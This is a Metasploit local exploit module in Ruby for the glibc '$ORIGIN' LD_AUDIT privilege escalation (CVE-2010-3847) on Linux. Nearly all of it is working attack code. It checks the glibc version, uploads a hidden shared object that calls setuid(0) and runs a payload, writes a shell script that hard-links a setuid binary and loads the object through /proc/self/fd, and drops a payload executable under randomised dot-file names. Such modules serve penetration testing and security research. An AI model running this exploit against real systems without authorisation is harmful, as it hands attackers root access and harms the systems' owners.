# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/local/linux&#039;
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Linux

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "glibc &#039;$ORIGIN&#039; Expansion Privilege Escalation",
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Linux systems by abusing
        a vulnerability in the GNU C Library (glibc) dynamic linker.

        glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not
        properly restrict use of the LD_AUDIT environment variable when loading
        setuid executables which allows control over the $ORIGIN library search
        path resulting in execution of arbitrary shared objects.

        This module opens a file descriptor to the specified suid executable via
        a hard link, then replaces the hard link with a shared object before
        instructing the linker to execute the file descriptor, resulting in
        arbitrary code execution.

        The specified setuid binary must be readable and located on the same
        file system partition as the specified writable directory.

        This module has been tested successfully on glibc version 2.5 on CentOS
        5.4 (x86_64), 2.5 on CentOS 5.5 (x86_64) and 2.12 on Fedora 13 (i386).

        RHEL 5 is reportedly affected, but untested. Some versions of ld.so
        hit a failed assertion in dl_open_worker causing exploitation to fail.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Tavis Ormandy&#039;, # Discovery and exploit
          &#039;Brendan Coles&#039;  # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 18 2010&#039;,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
          [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Linux x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2010-3847&#039; ],
          [ &#039;BID&#039;, &#039;44154&#039; ],
          [ &#039;EDB&#039;, &#039;15274&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2010/Oct/257&#039; ],
          [ &#039;URL&#039;, &#039;https://www.ubuntu.com/usn/usn-1009-1&#039; ],
          [ &#039;URL&#039;, &#039;https://security-tracker.debian.org/tracker/CVE-2010-3847&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/security/cve/CVE-2010-3847&#039; ]
        ]
    ))
    register_options(
      [
        OptString.new(&#039;SUID_EXECUTABLE&#039;, [ true, &#039;Path to a suid executable&#039;, &#039;/bin/ping&#039; ]),
        OptString.new(&#039;WritableDir&#039;,     [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
      ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;]
  end

  def suid_exe_path
    datastore[&#039;SUID_EXECUTABLE&#039;]
  end

  def check
    glibc_banner = cmd_exec &#039;ldd --version&#039;
    glibc_version = Gem::Version.new glibc_banner.scan(/^ldd\s+\(.*\)\s+([\d\.]+)/).flatten.first
    if glibc_version.eql? &#039;&#039;
      vprint_error &#039;Could not determine the GNU C library version&#039;
      return CheckCode::Safe
    elsif glibc_version >= Gem::Version.new(&#039;2.12.2&#039;) ||
          (glibc_version >= Gem::Version.new(&#039;2.11.3&#039;) && glibc_version < Gem::Version.new(&#039;2.12&#039;))
      vprint_error "GNU C Library version #{glibc_version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "GNU C Library version #{glibc_version} is vulnerable"

    unless setuid? suid_exe_path
      vprint_error "#{suid_exe_path} is not setuid"
      return CheckCode::Detected
    end
    vprint_good "#{suid_exe_path} is setuid"

    unless cmd_exec("test -r #{suid_exe_path} && echo true").include? &#039;true&#039;
      vprint_error("#{suid_exe_path} is not readable")
      return CheckCode::Detected
    end
    vprint_good "#{suid_exe_path} is readable"

    CheckCode::Appears
  end

  def upload_and_chmodx(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
    register_file_for_cleanup path
  end

  def exploit
    check_status = check

    if check_status == CheckCode::Appears
      print_good &#039;The target appears to be vulnerable&#039;
    elsif check_status == CheckCode::Detected
      fail_with Failure::BadConfig, "#{suid_exe_path} is not suid or not readable"
    else
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    suid_partition = cmd_exec "df -P -- &#039;#{suid_exe_path}&#039; | awk &#039;NR==2 {print $1}&#039;"
    base_partition = cmd_exec "df -P -- &#039;#{base_dir}&#039; | awk &#039;NR==2 {print $1}&#039;"
    if suid_partition == base_partition
      vprint_good "&#039;#{suid_exe_path}&#039; and &#039;#{base_dir}&#039; are located on the same partition"
    else
      print_warning "&#039;#{suid_exe_path}&#039; and &#039;#{base_dir}&#039; are not located on the same partition"
    end

    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
    payload_path = "#{base_dir}/#{payload_name}"

    # Set target
    uname = cmd_exec &#039;uname -m&#039;
    vprint_status "System architecture is #{uname}"
    if target.name.eql? &#039;Automatic&#039;
      case uname
      when &#039;x86_64&#039;
        my_target = targets[2]
      when /x86/, /i\d86/
        my_target = targets[1]
      else
        fail_with Failure::NoTarget, &#039;Unable to automatically select a target&#039;
      end
    else
      my_target = target
    end
    print_status "Using target: #{my_target.name}"

    cpu = nil
    case my_target[&#039;Arch&#039;]
    when ARCH_X86
      cpu = Metasm::Ia32.new
    when ARCH_X64
      cpu = Metasm::X86_64.new
    else
      fail_with Failure::NoTarget, &#039;Target is not compatible&#039;
    end

    # Compile shared object
    so_stub = %|
      extern int setuid(int);
      extern int setgid(int);
      extern int system(const char *__s);

      void init(void) __attribute__((constructor));

      void __attribute__((constructor)) init() {
        setuid(0);
        setgid(0);
        system("#{payload_path}");
      }
    |

    begin
      so = Metasm::ELF.compile_c(cpu, so_stub).encode_string(:lib)
    rescue
      print_error "Metasm encoding failed: #{$ERROR_INFO}"
      elog "Metasm encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
      elog "Call stack:\n#{$ERROR_INFO.backtrace.join "\n"}"
      fail_with Failure::Unknown, &#039;Metasm encoding failed&#039;
    end

    # Upload shared object
    so_name = ".#{rand_text_alphanumeric rand(5..10)}"
    so_path = "#{base_dir}/#{so_name}"
    upload_and_chmodx so_path, so

    # Upload exploit
    link_name = ".#{rand_text_alphanumeric rand(5..10)}"
    link_path = "#{base_dir}/#{link_name}"
    fd = rand(10..200)
    exp = %(
      rm -rf &#039;#{link_path}&#039;
      mkdir &#039;#{link_path}&#039;
      ln #{suid_exe_path} #{link_path}/#{link_name}
      exec #{fd}< #{link_path}/#{link_name}
      ls -l /proc/$$/fd/#{fd}
      rm -rf &#039;#{link_path}&#039;
      ls -l /proc/$$/fd/#{fd}
      mv #{so_path} #{link_path}
      LD_AUDIT="\\$ORIGIN" exec /proc/self/fd/#{fd}
    )

    exp_name = ".#{rand_text_alphanumeric rand(5..10)}"
    exp_path = "#{base_dir}/#{exp_name}"
    upload_and_chmodx exp_path, exp
    register_file_for_cleanup link_path

    # Upload payload
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status &#039;Launching exploit...&#039;
    # The echo at the end of the command is required
    # else the original session may die
    output = cmd_exec "#{exp_path}& echo "
    output.each_line { |line| vprint_status line.chomp }
  end
end

